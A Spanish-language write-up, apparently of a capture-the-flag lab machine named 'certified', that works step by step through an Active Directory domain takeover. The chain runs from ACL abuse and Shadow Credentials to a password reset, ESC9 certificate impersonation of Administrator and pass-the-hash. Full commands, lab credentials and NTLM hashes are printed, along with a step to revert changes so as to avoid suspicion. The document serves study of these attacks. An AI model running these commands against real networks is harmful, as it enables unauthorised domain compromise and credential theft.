// 02

BLOODHOUND — Camino hacia CA_OPERATOR

Con judith.mader:judith09 se recopila información con bloodhound-python para mapear el dominio.

recolección de datos con bloodhound
bloodhound-python -u 'judith.mader' -p 'judith09' -d 'certified.htb' -ns 10.129.231.186 -c all --zip
Cadena de abuso hacia CA_OPERATOR
El nombre CA_OPERATOR ya sugiere una relación con AD CS. El grafo muestra el siguiente camino desde judith.mader:

1. judith.mader tiene WriteOwner sobre el grupo MANAGEMENT.
2. Como propietaria del grupo, puede concederse GenericWrite sobre él y añadirse como miembro.
3. El grupo MANAGEMENT tiene GenericWrite sobre el usuario management_svc.
4. management_svc tiene GenericAll sobre ca_operator.
5. ca_operator pertenece al grupo REMOTE MANAGEMENT USERS, con acceso WinRM, y (a comprobar) puede ser el punto de entrada hacia una plantilla de certificado vulnerable.
// 03

ABUSO DE ACL — WriteOwner sobre MANAGEMENT

Se abusa del permiso WriteOwner para hacerse propietaria del grupo MANAGEMENT.

1. cambio de propietario del grupo
impacket-owneredit -action write -new-owner 'judith.mader' -target 'MANAGEMENT' 'certified.htb/judith.mader:judith09'

Se obtiene el DN exacto del grupo por LDAP.

2. dn del grupo
ldapsearch -x -H ldap://10.129.231.186 -D 'judith.mader@certified.htb' -w 'judith09' -b "dc=certified,dc=htb" "(cn=Management)" distinguishedName
dn: CN=Management,CN=Users,DC=certified,DC=htb

Como propietaria, se concede a sí misma el permiso WriteMembers sobre el grupo modificando su DACL.

3. autoconcesión de writemembers
impacket-dacledit -action write -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=Management,CN=Users,DC=certified,DC=htb' 'certified.htb/judith.mader:judith09'

Finalmente se añade al grupo Management, lo que le hereda el GenericWrite que este tiene sobre management_svc.

4. añadirse al grupo
net rpc group addmem "Management" "judith.mader" -U "certified.htb/judith.mader%judith09" -S 10.129.231.186 net rpc group members "Management" -U "certified.htb/judith.mader%judith09" -S 10.129.231.186
CERTIFIED\judith.mader CERTIFIED\management_svc
// 04

SHADOW CREDENTIALS — NT hash de management_svc

¿Qué es un ataque de Shadow Credentials?
Con GenericWrite sobre una cuenta se puede escribir en su atributo msDS-KeyCredentialLink, que almacena claves públicas para autenticación sin contraseña (PKINIT). Añadiendo una clave pública propia junto a su clave privada correspondiente, se puede pedir un TGT en nombre de esa cuenta y de ahí extraer su NT hash — sin tocar ni conocer su contraseña real.

Se automatiza el ataque completo con certipy shadow auto sobre management_svc.

shadow credentials sobre management_svc
certipy-ad shadow auto -u 'judith.mader@certified.htb' -p 'judith09' -account 'management_svc' -dc-ip 10.129.231.186
NT hash de management_svc
Se obtiene el hash NTLM de management_svc: a091c1832bcdd4677c28b5a6a1295584.
// 05

GENERICALL — Reset de contraseña de ca_operator

Con el hash de management_svc, y aprovechando su permiso GenericAll sobre ca_operator, se resetea su contraseña.

reset de contraseña
impacket-changepasswd 'certified.htb/CA_OPERATOR@10.129.231.186' -altuser 'management_svc' -althash 'aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584' -reset -newpass 'pwned'
Acceso como ca_operator
La nueva contraseña pwned funciona: ca_operator:pwned.
// 06

ADCS ESC9 — Suplantación de Administrator vía UPN

Como la máquina gira en torno a certificados, se enumera AD CS con certipy desde ca_operator.

enumeración de vulnerabilidades adcs
certipy-ad find -u 'ca_operator@certified.htb' -p 'pwned' -dc-ip 10.129.231.186 -vulnerable -stdout
[+] User Enrollable Principals : CERTIFIED.HTB\operator_ca [!] Vulnerabilities ESC9 : Template has no security extension.
¿Qué es ESC9?
Requiere tres condiciones: 1. la plantilla tiene NoSecurityExtension (no incluye el SID del solicitante en el certificado emitido); 2. se tiene permiso de Enroll con esa plantilla usando una cuenta cuyo userPrincipalName se puede modificar (gracias a un permiso adicional como GenericAll/GenericWrite sobre esa misma cuenta); 3. el StrongCertificateBindingEnforcement del dominio está en modo no estricto. La primera la confirma certipy; la segunda se cumple porque management_svc tiene GenericAll sobre ca_operator; la tercera no se puede comprobar sin más permisos, pero se intenta igualmente.

Se cambia temporalmente el UPN de ca_operator al del Administrator, usando el hash de management_svc.

1. suplantar el upn de administrator
certipy-ad account update -u 'management_svc@certified.htb' -hashes 'aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584' -dc-ip 10.129.231.186 -user 'ca_operator' -upn 'administrator@certified.htb'

Con el UPN suplantado, se solicita un certificado desde ca_operator usando una plantilla sin extensión de seguridad.

2. solicitud del certificado
certipy-ad req -u 'ca_operator@certified.htb' -p 'pwned' -dc-ip 10.129.231.186 -ca 'certified-DC01-CA' -template 'CertifiedAuthentication'
[*] Got certificate with UPN 'administrator@certified.htb' [*] Wrote certificate and private key to 'administrator.pfx'

Se revierte el UPN de ca_operator a su valor original para no levantar sospechas.

3. revertir el upn
certipy-ad account update -u 'management_svc@certified.htb' -hashes 'aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584' -dc-ip 10.129.231.186 -user 'ca_operator' -upn 'ca_operator@certified.htb'

Finalmente, se usa el certificado emitido (con el UPN del Administrador dentro) para autenticarse vía PKINIT y obtener su hash NTLM.

4. autenticación con el certificado
certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.129.231.186
Hash NTLM del Administrador
Se obtiene el hash NTLM de administrator@certified.htb: 0d5b49608bbce1751f708748f67e2d34.
// 07

ACCESO FINAL — Pass-The-Hash como Administrator

Con el hash del Administrador se realiza un ataque Pass-The-Hash con evil-winrm.

pass-the-hash con evil-winrm
evil-winrm -i 10.129.231.186 -u 'Administrator' -H '0d5b49608bbce1751f708748f67e2d34'

La conexión se establece correctamente. Como no se había pasado por ningún otro usuario para conseguir la flag de usuario, se recupera del escritorio de management_svc, y la de administrador del propio Administrador.
